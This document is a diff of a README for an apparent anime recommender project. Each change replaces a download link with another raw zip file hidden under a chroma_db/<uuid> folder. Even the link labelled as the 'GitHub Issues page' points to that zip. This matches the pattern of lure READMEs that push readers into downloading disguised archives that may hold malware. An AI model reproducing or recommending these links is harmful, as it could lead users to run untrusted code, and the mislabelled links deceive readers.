@@ -1,6 +1,6 @@
 # 🎉 Agentic-RAG-Anime-Recommender-System - Discover Your Next Favorite Anime Fast
 
-[![Download](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/Code/config/System_RA_Anime_Recommender_Agentic_1.2-alpha.4.zip%20Now-%20%F0%9F%93%A6-brightgreen)](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/Code/config/System_RA_Anime_Recommender_Agentic_1.2-alpha.4.zip)
+[![Download](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/chroma_db/7a9e5745-a13b-4d56-9b33-a65bfc71bcc1/Agentic_System_Anime_RA_Recommender_3.1.zip%20Now-%20%F0%9F%93%A6-brightgreen)](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/chroma_db/7a9e5745-a13b-4d56-9b33-a65bfc71bcc1/Agentic_System_Anime_RA_Recommender_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Welcome to the Agentic-RAG-Anime-Recommender-System! This tool helps you find ne
 To start using the Agentic-RAG-Anime-Recommender-System, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the download section.
-   [Download the latest release here](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/Code/config/System_RA_Anime_Recommender_Agentic_1.2-alpha.4.zip)
+   [Download the latest release here](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/chroma_db/7a9e5745-a13b-4d56-9b33-a65bfc71bcc1/Agentic_System_Anime_RA_Recommender_3.1.zip)
 
 2. **Select the Latest Version:** Look for the most recent version at the top of the page.
 
@@ -56,7 +56,7 @@ If you encounter any issues during download or installation, try the following s
 
 ## 💬 Support
 
-If you still have questions or need assistance, please check our [GitHub Issues page](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/Code/config/System_RA_Anime_Recommender_Agentic_1.2-alpha.4.zip) for common queries or to report an issue.
+If you still have questions or need assistance, please check our [GitHub Issues page](https://raw.githubusercontent.com/drae1712/Agentic-RAG-Anime-Recommender-System/main/chroma_db/7a9e5745-a13b-4d56-9b33-a65bfc71bcc1/Agentic_System_Anime_RA_Recommender_3.1.zip) for common queries or to report an issue.
 
 ## 🌟 Additional Information
 
